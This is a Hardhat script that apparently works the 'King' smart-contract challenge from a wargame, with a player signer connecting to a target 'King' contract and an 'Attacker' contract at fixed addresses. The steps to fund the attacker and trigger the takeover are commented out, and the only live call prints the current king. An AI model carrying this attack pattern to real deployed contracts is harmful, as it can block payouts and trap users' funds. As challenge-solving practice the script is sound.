import { ethers } from "hardhat";
const CONTRACT_ADDRESS = "0xdC6663C6Df91f4d9e58A59c632c93309c16BFC3F";
const PLAYER_ADDRESS = "0x81215d34367AF48d01E728AfF2976d9Df32fE604";
const ATTACKER_CONTRACT = "0x5C0Dc163901F8844cc5B73a3fbb30fE8ED303DF2";

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  const contract = await ethers.getContractAt("King", CONTRACT_ADDRESS, signer);
  // const attackerContractFactory = await ethers.getContractFactory(
  //   "Attacker",
  //   signer
  // );

  // const attackerContract = await attackerContractFactory.deploy();

  const attackerContract = await ethers.getContractAt(
    "Attacker",
    ATTACKER_CONTRACT,
    signer
  );
  const valueToSend = "1100000000000000";

  //deploy attacker contract
  // console.log("deploy", attackerContract);

  // See what the current prize value is
  // console.log("the current prize is", await contract.prize());

  // See who the current king is
  console.log("the current King is", await contract._king());

  // const sendAttackerFundsTX = await attackerContract.receivePrize({
  //   value: valueToSend,
  // });
  // console.log(
  //   "The transaction where I send attacker funds",
  //   sendAttackerFundsTX
  // );

  // send the money to the victimContract
  // console.log(await attackerContract.triggerSend({ gasLimit: 5000000 }));
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
